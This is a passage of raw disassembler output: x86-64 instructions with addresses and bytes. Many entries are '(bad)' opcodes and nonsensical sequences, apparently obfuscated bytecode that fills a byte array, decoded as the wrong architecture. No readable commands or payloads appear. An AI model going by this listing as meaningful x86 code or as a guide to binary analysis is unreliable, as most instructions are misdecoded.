  405178:	00 00                	add    %al,(%rax)
  40517a:	00 20                	add    %ah,(%rax)
  40517c:	4f 00 00             	rex.WRXB add %r8b,(%r8)
  40517f:	00 20                	add    %ah,(%rax)
  405181:	25 00 00 00 58       	and    $0x58000000,%eax
  405186:	9c                   	pushf
  405187:	20 8d 00 00 00 fe    	and    %cl,-0x2000000(%rbp)
  40518d:	0e                   	(bad)
  40518e:	33 00                	xor    (%rax),%eax
  405190:	38 28                	cmp    %ch,(%rax)
  405192:	19 00                	sbb    %eax,(%rax)
  405194:	00 39                	add    %bh,(%rcx)
  405196:	9d                   	popf
  405197:	10 00                	adc    %al,(%rax)
  405199:	00 38                	add    %bh,(%rax)
  40519b:	e1 e2                	loope  0x40517f
  40519d:	ff                   	(bad)
  40519e:	ff                   	(bad)
  40519f:	7e 08                	jle    0x4051a9
  4051a1:	00 00                	add    %al,(%rax)
  4051a3:	04 8e                	add    $0x8e,%al
  4051a5:	69 3a 9a f8 ff ff    	imul   $0xfffff89a,(%rdx),%edi
  4051ab:	20 6f 01             	and    %ch,0x1(%rdi)
  4051ae:	00 00                	add    %al,(%rax)
  4051b0:	fe 0e                	decb   (%rsi)
  4051b2:	33 00                	xor    (%rax),%eax
  4051b4:	38 c7                	cmp    %al,%bh
  4051b6:	e2 ff                	loop   0x4051b7
  4051b8:	ff                   	(bad)
  4051b9:	fe 0c 27             	decb   (%rdi,%riz,1)
  4051bc:	00 20                	add    %ah,(%rax)
  4051be:	12 00                	adc    (%rax),%al
  4051c0:	00 00                	add    %al,(%rax)
  4051c2:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  4051c5:	00 9c 20 56 00 00 00 	add    %bl,0x56(%rax,%riz,1)
  4051cc:	38 ab e2 ff ff 20    	cmp    %ch,0x20ffffe2(%rbx)
  4051d2:	cd 00                	int    $0x0
  4051d4:	00 00                	add    %al,(%rax)
  4051d6:	20 44 00 00          	and    %al,0x0(%rax,%rax,1)
  4051da:	00 59 fe             	add    %bl,-0x2(%rcx)
  4051dd:	0e                   	(bad)
  4051de:	2b 00                	sub    (%rax),%eax
  4051e0:	20 1c 01             	and    %bl,(%rcx,%rax,1)
  4051e3:	00 00                	add    %al,(%rax)
  4051e5:	38 92 e2 ff ff fe    	cmp    %dl,-0x100001e(%rdx)
  4051eb:	0c 27                	or     $0x27,%al
  4051ed:	00 20                	add    %ah,(%rax)
  4051ef:	18 00                	sbb    %al,(%rax)
  4051f1:	00 00                	add    %al,(%rax)
  4051f3:	20 d0                	and    %dl,%al
  4051f5:	00 00                	add    %al,(%rax)
  4051f7:	00 20                	add    %ah,(%rax)
  4051f9:	79 00                	jns    0x4051fb
  4051fb:	00 00                	add    %al,(%rax)
  4051fd:	59                   	pop    %rcx
  4051fe:	9c                   	pushf
  4051ff:	20 34 00             	and    %dh,(%rax,%rax,1)
  405202:	00 00                	add    %al,(%rax)
  405204:	fe 0e                	decb   (%rsi)
  405206:	33 00                	xor    (%rax),%eax
  405208:	38 73 e2             	cmp    %dh,-0x1e(%rbx)
  40520b:	ff                   	(bad)
  40520c:	ff 20                	jmp    *(%rax)
  40520e:	22 00                	and    (%rax),%al
  405210:	00 00                	add    %al,(%rax)
  405212:	20 2f                	and    %ch,(%rdi)
  405214:	00 00                	add    %al,(%rax)
  405216:	00 58 fe             	add    %bl,-0x2(%rax)
  405219:	0e                   	(bad)
  40521a:	0b 00                	or     (%rax),%eax
  40521c:	20 9e 00 00 00 fe    	and    %bl,-0x2000000(%rsi)
  405222:	0e                   	(bad)
  405223:	33 00                	xor    (%rax),%eax
  405225:	16                   	(bad)
  405226:	39 55 e2             	cmp    %edx,-0x1e(%rbp)
  405229:	ff                   	(bad)
  40522a:	ff                   	(bad)
  40522b:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  40522e:	00 20                	add    %ah,(%rax)
  405230:	09 00                	or     %eax,(%rax)
  405232:	00 00                	add    %al,(%rax)
  405234:	fe 0c 0b             	decb   (%rbx,%rcx,1)
  405237:	00 9c 20 e4 00 00 00 	add    %bl,0xe4(%rax,%riz,1)
  40523e:	fe 0e                	decb   (%rsi)
  405240:	33 00                	xor    (%rax),%eax
  405242:	38 39                	cmp    %bh,(%rcx)
  405244:	e2 ff                	loop   0x405245
  405246:	ff                   	(bad)
  405247:	fe 0c 27             	decb   (%rdi,%riz,1)
  40524a:	00 20                	add    %ah,(%rax)
  40524c:	0c 00                	or     $0x0,%al
  40524e:	00 00                	add    %al,(%rax)
  405250:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  405253:	00 9c 20 87 01 00 00 	add    %bl,0x187(%rax,%riz,1)
  40525a:	38 1d e2 ff ff fe    	cmp    %bl,-0x100001e(%rip)        # 0xffffffffff405242
  405260:	0c 2f                	or     $0x2f,%al
  405262:	00 20                	add    %ah,(%rax)
  405264:	01 00                	add    %eax,(%rax)
  405266:	00 00                	add    %al,(%rax)
  405268:	20 61 00             	and    %ah,0x0(%rcx)
  40526b:	00 00                	add    %al,(%rax)
  40526d:	20 42 00             	and    %al,0x0(%rdx)
  405270:	00 00                	add    %al,(%rax)
  405272:	58                   	pop    %rax
  405273:	9c                   	pushf
  405274:	20 54 00 00          	and    %dl,0x0(%rax,%rax,1)
  405278:	00 fe                	add    %bh,%dh
  40527a:	0e                   	(bad)
  40527b:	33 00                	xor    (%rax),%eax
  40527d:	38 fe                	cmp    %bh,%dh
  40527f:	e1 ff                	loope  0x405280
  405281:	ff                   	(bad)
  405282:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  405285:	00 20                	add    %ah,(%rax)
  405287:	0b 00                	or     (%rax),%eax
  405289:	00 00                	add    %al,(%rax)
  40528b:	fe 0c 1e             	decb   (%rsi,%rbx,1)
  40528e:	00 9c 20 59 01 00 00 	add    %bl,0x159(%rax,%riz,1)
  405295:	38 e2                	cmp    %ah,%dl
  405297:	e1 ff                	loope  0x405298
  405299:	ff                   	(bad)
  40529a:	fe 0c 27             	decb   (%rdi,%riz,1)
  40529d:	00 20                	add    %ah,(%rax)
  40529f:	01 00                	add    %eax,(%rax)
  4052a1:	00 00                	add    %al,(%rax)
  4052a3:	fe 0c 0c             	decb   (%rsp,%rcx,1)
  4052a6:	00 9c 20 19 01 00 00 	add    %bl,0x119(%rax,%riz,1)
  4052ad:	38 ca                	cmp    %cl,%dl
  4052af:	e1 ff                	loope  0x4052b0
  4052b1:	ff                   	(bad)
  4052b2:	fe 0c 27             	decb   (%rdi,%riz,1)
  4052b5:	00 20                	add    %ah,(%rax)
  4052b7:	1d 00 00 00 20       	sbb    $0x20000000,%eax
  4052bc:	23 00                	and    (%rax),%eax
  4052be:	00 00                	add    %al,(%rax)
  4052c0:	20 78 00             	and    %bh,0x0(%rax)
  4052c3:	00 00                	add    %al,(%rax)
  4052c5:	58                   	pop    %rax
  4052c6:	9c                   	pushf
  4052c7:	20 e3                	and    %ah,%bl
  4052c9:	00 00                	add    %al,(%rax)
  4052cb:	00 fe                	add    %bh,%dh
  4052cd:	0e                   	(bad)
  4052ce:	33 00                	xor    (%rax),%eax
  4052d0:	16                   	(bad)
  4052d1:	39 aa e1 ff ff fe    	cmp    %ebp,-0x100001f(%rdx)
  4052d7:	0c 27                	or     $0x27,%al
  4052d9:	00 20                	add    %ah,(%rax)
  4052db:	02 00                	add    (%rax),%al
  4052dd:	00 00                	add    %al,(%rax)
  4052df:	20 7c 00 00          	and    %bh,0x0(%rax,%rax,1)
  4052e3:	00 20                	add    %ah,(%rax)
  4052e5:	6c                   	insb   (%dx),(%rdi)
  4052e6:	00 00                	add    %al,(%rax)
  4052e8:	00 58 9c             	add    %bl,-0x64(%rax)
  4052eb:	20 62 00             	and    %ah,0x0(%rdx)
  4052ee:	00 00                	add    %al,(%rax)
  4052f0:	38 8f e1 ff ff fe    	cmp    %cl,-0x100001f(%rdi)
  4052f6:	0c 27                	or     $0x27,%al
  4052f8:	00 20                	add    %ah,(%rax)
  4052fa:	11 00                	adc    %eax,(%rax)
  4052fc:	00 00                	add    %al,(%rax)
  4052fe:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  405301:	00 9c 20 64 00 00 00 	add    %bl,0x64(%rax,%riz,1)
  405308:	38 77 e1             	cmp    %dh,-0x1f(%rdi)
  40530b:	ff                   	(bad)
  40530c:	ff 20                	jmp    *(%rax)
  40530e:	c1 00 00             	roll   $0x0,(%rax)
  405311:	00 20                	add    %ah,(%rax)
  405313:	40 00 00             	rex add %al,(%rax)
  405316:	00 59 fe             	add    %bl,-0x2(%rcx)
  405319:	0e                   	(bad)
  40531a:	1e                   	(bad)
  40531b:	00 20                	add    %ah,(%rax)
  40531d:	85 00                	test   %eax,(%rax)
  40531f:	00 00                	add    %al,(%rax)
  405321:	38 56 e1             	cmp    %dl,-0x1f(%rsi)
  405324:	ff                   	(bad)
  405325:	ff                   	(bad)
  405326:	fe 0c 27             	decb   (%rdi,%riz,1)
  405329:	00 20                	add    %ah,(%rax)
  40532b:	1f                   	(bad)
  40532c:	00 00                	add    %al,(%rax)
  40532e:	00 fe                	add    %bh,%dh
  405330:	0c 2b                	or     $0x2b,%al
  405332:	00 9c 20 90 00 00 00 	add    %bl,0x90(%rax,%riz,1)
  405339:	fe 0e                	decb   (%rsi)
  40533b:	33 00                	xor    (%rax),%eax
  40533d:	38 85 17 00 00 39    	cmp    %al,0x39000017(%rbp)
  405343:	86 11                	xchg   %dl,(%rcx)
  405345:	00 00                	add    %al,(%rax)
  405347:	38 34 e1             	cmp    %dh,(%rcx,%riz,8)
  40534a:	ff                   	(bad)
  40534b:	ff                   	(bad)
  40534c:	fe 0c 27             	decb   (%rdi,%riz,1)
  40534f:	00 20                	add    %ah,(%rax)
  405351:	1a 00                	sbb    (%rax),%al
  405353:	00 00                	add    %al,(%rax)
  405355:	20 21                	and    %ah,(%rcx)
  405357:	00 00                	add    %al,(%rax)
  405359:	00 20                	add    %ah,(%rax)
  40535b:	16                   	(bad)
  40535c:	00 00                	add    %al,(%rax)
  40535e:	00 59 9c             	add    %bl,-0x64(%rcx)
  405361:	20 06                	and    %al,(%rsi)
  405363:	00 00                	add    %al,(%rax)
  405365:	00 fe                	add    %bh,%dh
  405367:	0e                   	(bad)
  405368:	33 00                	xor    (%rax),%eax
  40536a:	38 11                	cmp    %dl,(%rcx)
  40536c:	e1 ff                	loope  0x40536d
  40536e:	ff                   	(bad)
  40536f:	fe 0c 27             	decb   (%rdi,%riz,1)
  405372:	00 20                	add    %ah,(%rax)
  405374:	1f                   	(bad)
  405375:	00 00                	add    %al,(%rax)
  405377:	00 20                	add    %ah,(%rax)
  405379:	1b 00                	sbb    (%rax),%eax
  40537b:	00 00                	add    %al,(%rax)
  40537d:	20 28                	and    %ch,(%rax)
  40537f:	00 00                	add    %al,(%rax)
  405381:	00 58 9c             	add    %bl,-0x64(%rax)
  405384:	20 77 00             	and    %dh,0x0(%rdi)
  405387:	00 00                	add    %al,(%rax)
  405389:	fe 0e                	decb   (%rsi)
  40538b:	33 00                	xor    (%rax),%eax
  40538d:	17                   	(bad)
  40538e:	3a ed                	cmp    %ch,%ch
  405390:	e0 ff                	loopne 0x405391
  405392:	ff 20                	jmp    *(%rax)
  405394:	3b 00                	cmp    (%rax),%eax
  405396:	00 00                	add    %al,(%rax)
  405398:	20 4e 00             	and    %cl,0x0(%rsi)
  40539b:	00 00                	add    %al,(%rax)
  40539d:	58                   	pop    %rax
  40539e:	fe 0e                	decb   (%rsi)
  4053a0:	0c 00                	or     $0x0,%al
  4053a2:	20 01                	and    %al,(%rcx)
  4053a4:	01 00                	add    %eax,(%rax)
  4053a6:	00 38                	add    %bh,(%rax)
  4053a8:	d8 e0                	fsub   %st(0),%st
  4053aa:	ff                   	(bad)
  4053ab:	ff                   	(bad)
  4053ac:	fe 0c 27             	decb   (%rdi,%riz,1)
  4053af:	00 20                	add    %ah,(%rax)
  4053b1:	09 00                	or     %eax,(%rax)
  4053b3:	00 00                	add    %al,(%rax)
  4053b5:	fe 0c 0c             	decb   (%rsp,%rcx,1)
  4053b8:	00 9c 20 2b 01 00 00 	add    %bl,0x12b(%rax,%riz,1)
  4053bf:	38 c0                	cmp    %al,%al
  4053c1:	e0 ff                	loopne 0x4053c2
  4053c3:	ff                   	(bad)
  4053c4:	fe 0c 27             	decb   (%rdi,%riz,1)
  4053c7:	00 20                	add    %ah,(%rax)
  4053c9:	1a 00                	sbb    (%rax),%al
  4053cb:	00 00                	add    %al,(%rax)
  4053cd:	20 e5                	and    %ah,%ch
  4053cf:	00 00                	add    %al,(%rax)
  4053d1:	00 20                	add    %ah,(%rax)
  4053d3:	4c 00 00             	rex.WR add %r8b,(%rax)
  4053d6:	00 59 9c             	add    %bl,-0x64(%rcx)
  4053d9:	20 4a 00             	and    %cl,0x0(%rdx)
  4053dc:	00 00                	add    %al,(%rax)
  4053de:	38 a1 e0 ff ff 20    	cmp    %ah,0x20ffffe0(%rcx)
  4053e4:	c8 00 00 00          	enter  $0x0,$0x0
  4053e8:	20 20                	and    %ah,(%rax)
  4053ea:	00 00                	add    %al,(%rax)
  4053ec:	00 58 fe             	add    %bl,-0x2(%rax)
  4053ef:	0e                   	(bad)
  4053f0:	0c 00                	or     $0x0,%al
  4053f2:	20 35 00 00 00 38    	and    %dh,0x38000000(%rip)        # 0x384053f8
  4053f8:	80 e0 ff             	and    $0xff,%al
  4053fb:	ff 20                	jmp    *(%rax)
  4053fd:	a7                   	cmpsl  (%rdi),(%rsi)
  4053fe:	00 00                	add    %al,(%rax)
  405400:	00 20                	add    %ah,(%rax)
  405402:	37                   	(bad)
  405403:	00 00                	add    %al,(%rax)
  405405:	00 59 fe             	add    %bl,-0x2(%rcx)
  405408:	0e                   	(bad)
  405409:	2b 00                	sub    (%rax),%eax
  40540b:	20 58 00             	and    %bl,0x0(%rax)
  40540e:	00 00                	add    %al,(%rax)
  405410:	38 67 e0             	cmp    %ah,-0x20(%rdi)
  405413:	ff                   	(bad)
  405414:	ff                   	(bad)
  405415:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  405418:	00 20                	add    %ah,(%rax)
  40541a:	05 00 00 00 fe       	add    $0xfe000000,%eax
  40541f:	0c 1e                	or     $0x1e,%al
  405421:	00 9c 20 29 00 00 00 	add    %bl,0x29(%rax,%riz,1)
  405428:	38 57 e0             	cmp    %dl,-0x20(%rdi)
  40542b:	ff                   	(bad)
  40542c:	ff                   	(bad)
  40542d:	fe 0c 27             	decb   (%rdi,%riz,1)
  405430:	00 20                	add    %ah,(%rax)
  405432:	1b 00                	sbb    (%rax),%eax
  405434:	00 00                	add    %al,(%rax)
  405436:	20 a5 00 00 00 20    	and    %ah,0x20000000(%rbp)
  40543c:	11 00                	adc    %eax,(%rax)
  40543e:	00 00                	add    %al,(%rax)
  405440:	58                   	pop    %rax
  405441:	9c                   	pushf
  405442:	20 2c 01             	and    %ch,(%rcx,%rax,1)
  405445:	00 00                	add    %al,(%rax)
  405447:	fe 0e                	decb   (%rsi)
  405449:	33 00                	xor    (%rax),%eax
  40544b:	38 81 16 00 00 39    	cmp    %al,0x39000016(%rcx)
  405451:	d0 01                	rolb   $1,(%rcx)
  405453:	00 00                	add    %al,(%rax)
  405455:	38 26                	cmp    %ah,(%rsi)
  405457:	e0 ff                	loopne 0x405458
  405459:	ff                   	(bad)
  40545a:	fe 0c 27             	decb   (%rdi,%riz,1)
  40545d:	00 20                	add    %ah,(%rax)
  40545f:	11 00                	adc    %eax,(%rax)
  405461:	00 00                	add    %al,(%rax)
  405463:	fe 0c 0c             	decb   (%rsp,%rcx,1)
  405466:	00 9c 20 3c 00 00 00 	add    %bl,0x3c(%rax,%riz,1)
  40546d:	38 0a                	cmp    %cl,(%rdx)
  40546f:	e0 ff                	loopne 0x405470
  405471:	ff 11                	call   *(%rcx)
  405473:	24 8e                	and    $0x8e,%al
  405475:	69 1a 5d 13 1d 20    	imul   $0x201d135d,(%rdx),%ebx
  40547b:	8c 01                	mov    %es,(%rcx)
  40547d:	00 00                	add    %al,(%rax)
  40547f:	38 00                	cmp    %al,(%rax)
  405481:	e0 ff                	loopne 0x405482
  405483:	ff                   	(bad)
  405484:	fe 0c 27             	decb   (%rdi,%riz,1)
  405487:	00 20                	add    %ah,(%rax)
  405489:	13 00                	adc    (%rax),%eax
  40548b:	00 00                	add    %al,(%rax)
  40548d:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  405490:	00 9c 20 b8 00 00 00 	add    %bl,0xb8(%rax,%riz,1)
  405497:	fe 0e                	decb   (%rsi)
  405499:	33 00                	xor    (%rax),%eax
  40549b:	38 3b                	cmp    %bh,(%rbx)
  40549d:	16                   	(bad)
  40549e:	00 00                	add    %al,(%rax)
  4054a0:	3a f6                	cmp    %dh,%dh
  4054a2:	11 00                	adc    %eax,(%rax)
  4054a4:	00 38                	add    %bh,(%rax)
  4054a6:	d6                   	udb
  4054a7:	df ff                	(bad)
  4054a9:	ff 11                	call   *(%rcx)
  4054ab:	25 1b 11 19 18       	and    $0x1819111b,%eax
  4054b0:	91                   	xchg   %eax,%ecx
  4054b1:	9c                   	pushf
  4054b2:	20 85 01 00 00 38    	and    %al,0x38000001(%rbp)
  4054b8:	c8 df ff ff          	enter  $0xffdf,$0xff
  4054bc:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  4054bf:	00 20                	add    %ah,(%rax)
  4054c1:	0f 00 00             	sldt   (%rax)
  4054c4:	00 20                	add    %ah,(%rax)
  4054c6:	4f 00 00             	rex.WRXB add %r8b,(%r8)
  4054c9:	00 20                	add    %ah,(%rax)
  4054cb:	77 00                	ja     0x4054cd
  4054cd:	00 00                	add    %al,(%rax)
  4054cf:	58                   	pop    %rax
  4054d0:	9c                   	pushf
  4054d1:	20 76 01             	and    %dh,0x1(%rsi)
  4054d4:	00 00                	add    %al,(%rax)
  4054d6:	38 a1 df ff ff 7e    	cmp    %ah,0x7effffdf(%rcx)
  4054dc:	08 00                	or     %al,(%rax)
  4054de:	00 04 13             	add    %al,(%rbx,%rdx,1)
  4054e1:	24 20                	and    $0x20,%al
  4054e3:	5e                   	pop    %rsi
  4054e4:	01 00                	add    %eax,(%rax)
  4054e6:	00 fe                	add    %bh,%dh
  4054e8:	0e                   	(bad)
  4054e9:	33 00                	xor    (%rax),%eax
  4054eb:	38 f5                	cmp    %dh,%ch
  4054ed:	15 00 00 3a ee       	adc    $0xee3a0000,%eax
  4054f2:	08 00                	or     %al,(%rax)
  4054f4:	00 38                	add    %bh,(%rax)
  4054f6:	86 df                	xchg   %bl,%bh
  4054f8:	ff                   	(bad)
  4054f9:	ff                   	(bad)
  4054fa:	fe 0c 27             	decb   (%rdi,%riz,1)
  4054fd:	00 20                	add    %ah,(%rax)
  4054ff:	16                   	(bad)
  405500:	00 00                	add    %al,(%rax)
  405502:	00 20                	add    %ah,(%rax)
  405504:	ab                   	stos   %eax,(%rdi)
  405505:	00 00                	add    %al,(%rax)
  405507:	00 20                	add    %ah,(%rax)
  405509:	75 00                	jne    0x40550b
  40550b:	00 00                	add    %al,(%rax)
  40550d:	59                   	pop    %rcx
  40550e:	9c                   	pushf
  40550f:	20 c2                	and    %al,%dl
  405511:	00 00                	add    %al,(%rax)
  405513:	00 38                	add    %bh,(%rax)
  405515:	6b df ff             	imul   $0xffffffff,%edi,%ebx
  405518:	ff                   	(bad)
  405519:	38 ed                	cmp    %ch,%ch
  40551b:	dc ff                	fdivr  %st,%st(7)
  40551d:	ff 11                	call   *(%rcx)
  40551f:	0a 11                	or     (%rcx),%dl
  405521:	0e                   	(bad)
  405522:	61                   	(bad)
  405523:	13 05 20 c8 00 00    	adc    0xc820(%rip),%eax        # 0x411d49
  405529:	00 fe                	add    %bh,%dh
  40552b:	0e                   	(bad)
  40552c:	33 00                	xor    (%rax),%eax
  40552e:	38 bc 15 00 00 3a 11 	cmp    %bh,0x113a0000(%rbp,%rdx,1)
  405535:	01 00                	add    %eax,(%rax)
  405537:	00 38                	add    %bh,(%rax)
  405539:	43 df ff             	rex.XB (bad)
  40553c:	ff 11                	call   *(%rcx)
  40553e:	1d 16 3e d9 ff       	sbb    $0xffd93e16,%eax
  405543:	ff                   	(bad)
  405544:	ff 20                	jmp    *(%rax)
  405546:	cf                   	iret
  405547:	00 00                	add    %al,(%rax)
  405549:	00 fe                	add    %bh,%dh
  40554b:	0e                   	(bad)
  40554c:	33 00                	xor    (%rax),%eax
  40554e:	38 a6 15 00 00 3a    	cmp    %ah,0x3a000015(%rsi)
  405554:	28 df                	sub    %bl,%bh
  405556:	ff                   	(bad)
  405557:	ff                   	(bad)
  405558:	fe 0c 27             	decb   (%rdi,%riz,1)
  40555b:	00 20                	add    %ah,(%rax)
  40555d:	06                   	(bad)
  40555e:	00 00                	add    %al,(%rax)
  405560:	00 20                	add    %ah,(%rax)
  405562:	0c 00                	or     $0x0,%al
  405564:	00 00                	add    %al,(%rax)
  405566:	20 6b 00             	and    %ch,0x0(%rbx)
  405569:	00 00                	add    %al,(%rax)
  40556b:	58                   	pop    %rax
  40556c:	9c                   	pushf
  40556d:	20 97 00 00 00 38    	and    %dl,0x38000000(%rdi)
  405573:	05 df ff ff 16       	add    $0x16ffffdf,%eax
  405578:	13 1b                	adc    (%rbx),%ebx
  40557a:	20 9c 00 00 00 fe 0e 	and    %bl,0xefe0000(%rax,%rax,1)
  405581:	33 00                	xor    (%rax),%eax
  405583:	38 7b 15             	cmp    %bh,0x15(%rbx)
  405586:	00 00                	add    %al,(%rax)
  405588:	39 f3                	cmp    %esi,%ebx
  40558a:	de ff                	fdivrp %st,%st(7)
  40558c:	ff                   	(bad)
  40558d:	fe 0c 27             	decb   (%rdi,%riz,1)
  405590:	00 20                	add    %ah,(%rax)
  405592:	02 00                	add    (%rax),%al
  405594:	00 00                	add    %al,(%rax)
  405596:	20 7a 00             	and    %bh,0x0(%rdx)
  405599:	00 00                	add    %al,(%rax)
  40559b:	20 76 00             	and    %dh,0x0(%rsi)
  40559e:	00 00                	add    %al,(%rax)
  4055a0:	58                   	pop    %rax
  4055a1:	9c                   	pushf
  4055a2:	20 4f 00             	and    %cl,0x0(%rdi)
  4055a5:	00 00                	add    %al,(%rax)
  4055a7:	38 d0                	cmp    %dl,%al
  4055a9:	de ff                	fdivrp %st,%st(7)
  4055ab:	ff                   	(bad)
  4055ac:	fe 0c 27             	decb   (%rdi,%riz,1)
  4055af:	00 20                	add    %ah,(%rax)
  4055b1:	00 00                	add    %al,(%rax)
  4055b3:	00 00                	add    %al,(%rax)
  4055b5:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  4055b8:	00 9c 20 45 01 00 00 	add    %bl,0x145(%rax,%riz,1)
  4055bf:	fe 0e                	decb   (%rsi)
  4055c1:	33 00                	xor    (%rax),%eax
  4055c3:	38 45 15             	cmp    %al,0x15(%rbp)
  4055c6:	00 00                	add    %al,(%rax)
  4055c8:	39 bb f8 ff ff 38    	cmp    %edi,0x38fffff8(%rbx)
  4055ce:	ae                   	scas   (%rdi),%al
  4055cf:	de ff                	fdivrp %st,%st(7)
  4055d1:	ff 20                	jmp    *(%rax)
  4055d3:	3c 00                	cmp    $0x0,%al
  4055d5:	00 00                	add    %al,(%rax)
  4055d7:	20 30                	and    %dh,(%rax)
  4055d9:	00 00                	add    %al,(%rax)
  4055db:	00 58 fe             	add    %bl,-0x2(%rax)
  4055de:	0e                   	(bad)
  4055df:	2b 00                	sub    (%rax),%eax
  4055e1:	20 30                	and    %dh,(%rax)
  4055e3:	00 00                	add    %al,(%rax)
  4055e5:	00 fe                	add    %bh,%dh
  4055e7:	0e                   	(bad)
  4055e8:	33 00                	xor    (%rax),%eax
  4055ea:	17                   	(bad)
  4055eb:	3a 90 de ff ff 20    	cmp    0x20ffffde(%rax),%dl
  4055f1:	25 00 00 00 20       	and    $0x20000000,%eax
  4055f6:	70 00                	jo     0x4055f8
  4055f8:	00 00                	add    %al,(%rax)
  4055fa:	58                   	pop    %rax
  4055fb:	fe 0e                	decb   (%rsi)
  4055fd:	1e                   	(bad)
  4055fe:	00 20                	add    %ah,(%rax)
  405600:	45 00 00             	add    %r8b,(%r8)
  405603:	00 38                	add    %bh,(%rax)
  405605:	7b de                	jnp    0x4055e5
  405607:	ff                   	(bad)
  405608:	ff                   	(bad)
  405609:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  40560c:	00 20                	add    %ah,(%rax)
  40560e:	05 00 00 00 fe       	add    $0xfe000000,%eax
  405613:	0c 1e                	or     $0x1e,%al
  405615:	00 9c 20 b2 00 00 00 	add    %bl,0xb2(%rax,%riz,1)
  40561c:	fe 0e                	decb   (%rsi)
  40561e:	33 00                	xor    (%rax),%eax
  405620:	38 5b de             	cmp    %bl,-0x22(%rbx)
  405623:	ff                   	(bad)
  405624:	ff                   	(bad)
  405625:	fe 0c 27             	decb   (%rdi,%riz,1)
  405628:	00 20                	add    %ah,(%rax)
  40562a:	0b 00                	or     (%rax),%eax
  40562c:	00 00                	add    %al,(%rax)
  40562e:	20 7a 00             	and    %bh,0x0(%rdx)
  405631:	00 00                	add    %al,(%rax)
  405633:	20 23                	and    %ah,(%rbx)
  405635:	00 00                	add    %al,(%rax)
  405637:	00 59 9c             	add    %bl,-0x64(%rcx)
  40563a:	20 ca                	and    %cl,%dl
  40563c:	00 00                	add    %al,(%rax)
  40563e:	00 fe                	add    %bh,%dh
  405640:	0e                   	(bad)
  405641:	33 00                	xor    (%rax),%eax
  405643:	16                   	(bad)
  405644:	39 37                	cmp    %esi,(%rdi)
  405646:	de ff                	fdivrp %st,%st(7)
  405648:	ff                   	(bad)
  405649:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  40564c:	00 20                	add    %ah,(%rax)
  40564e:	0e                   	(bad)
  40564f:	00 00                	add    %al,(%rax)
  405651:	00 fe                	add    %bh,%dh
  405653:	0c 1e                	or     $0x1e,%al
  405655:	00 9c 20 9d 01 00 00 	add    %bl,0x19d(%rax,%riz,1)
  40565c:	38 1b                	cmp    %bl,(%rbx)
  40565e:	de ff                	fdivrp %st,%st(7)
  405660:	ff                   	(bad)
  405661:	fe 0c 27             	decb   (%rdi,%riz,1)
  405664:	00 20                	add    %ah,(%rax)
  405666:	07                   	(bad)
  405667:	00 00                	add    %al,(%rax)
  405669:	00 20                	add    %ah,(%rax)
  40566b:	6f                   	outsl  (%rsi),(%dx)
  40566c:	00 00                	add    %al,(%rax)
  40566e:	00 20                	add    %ah,(%rax)
  405670:	41 00 00             	add    %al,(%r8)
  405673:	00 58 9c             	add    %bl,-0x64(%rax)
  405676:	20 db                	and    %bl,%bl
  405678:	00 00                	add    %al,(%rax)
  40567a:	00 38                	add    %bh,(%rax)
  40567c:	fc                   	cld
  40567d:	dd ff                	(bad)
  40567f:	ff 20                	jmp    *(%rax)
  405681:	08 00                	or     %al,(%rax)
  405683:	00 00                	add    %al,(%rax)
  405685:	20 43 00             	and    %al,0x0(%rbx)
  405688:	00 00                	add    %al,(%rax)
  40568a:	58                   	pop    %rax
  40568b:	fe 0e                	decb   (%rsi)
  40568d:	0c 00                	or     $0x0,%al
  40568f:	20 32                	and    %dh,(%rdx)
  405691:	00 00                	add    %al,(%rax)
  405693:	00 fe                	add    %bh,%dh
  405695:	0e                   	(bad)
  405696:	33 00                	xor    (%rax),%eax
  405698:	38 e3                	cmp    %ah,%bl
  40569a:	dd ff                	(bad)
  40569c:	ff                   	(bad)
  40569d:	fe 0c 27             	decb   (%rdi,%riz,1)
  4056a0:	00 20                	add    %ah,(%rax)
  4056a2:	1a 00                	sbb    (%rax),%al
  4056a4:	00 00                	add    %al,(%rax)
  4056a6:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  4056a9:	00 9c 20 ad 00 00 00 	add    %bl,0xad(%rax,%riz,1)
  4056b0:	38 c7                	cmp    %al,%bh
  4056b2:	dd ff                	(bad)
  4056b4:	ff                   	(bad)
  4056b5:	fe 0c 27             	decb   (%rdi,%riz,1)
  4056b8:	00 20                	add    %ah,(%rax)
  4056ba:	13 00                	adc    (%rax),%eax
  4056bc:	00 00                	add    %al,(%rax)
  4056be:	20 e7                	and    %ah,%bh
  4056c0:	00 00                	add    %al,(%rax)
  4056c2:	00 20                	add    %ah,(%rax)
  4056c4:	4d 00 00             	rex.WRB add %r8b,(%r8)
  4056c7:	00 59 9c             	add    %bl,-0x64(%rcx)
  4056ca:	20 78 00             	and    %bh,0x0(%rax)
  4056cd:	00 00                	add    %al,(%rax)
  4056cf:	38 a8 dd ff ff 20    	cmp    %ch,0x20ffffdd(%rax)
  4056d5:	25 00 00 00 20       	and    $0x20000000,%eax
  4056da:	0e                   	(bad)
  4056db:	00 00                	add    %al,(%rax)
  4056dd:	00 58 fe             	add    %bl,-0x2(%rax)
  4056e0:	0e                   	(bad)
  4056e1:	0b 00                	or     (%rax),%eax
  4056e3:	20 be 00 00 00 fe    	and    %bh,-0x2000000(%rsi)
  4056e9:	0e                   	(bad)
  4056ea:	33 00                	xor    (%rax),%eax
  4056ec:	38 26                	cmp    %ah,(%rsi)
  4056ee:	14 00                	adc    $0x0,%al
  4056f0:	00 39                	add    %bh,(%rcx)
  4056f2:	8a dd                	mov    %ch,%bl
  4056f4:	ff                   	(bad)
  4056f5:	ff                   	(bad)
  4056f6:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  4056f9:	00 20                	add    %ah,(%rax)
  4056fb:	0d 00 00 00 20       	or     $0x20000000,%eax
  405700:	23 00                	and    (%rax),%eax
  405702:	00 00                	add    %al,(%rax)
  405704:	20 4d 00             	and    %cl,0x0(%rbp)
  405707:	00 00                	add    %al,(%rax)
  405709:	58                   	pop    %rax
  40570a:	9c                   	pushf
  40570b:	20 61 01             	and    %ah,0x1(%rcx)
  40570e:	00 00                	add    %al,(%rax)
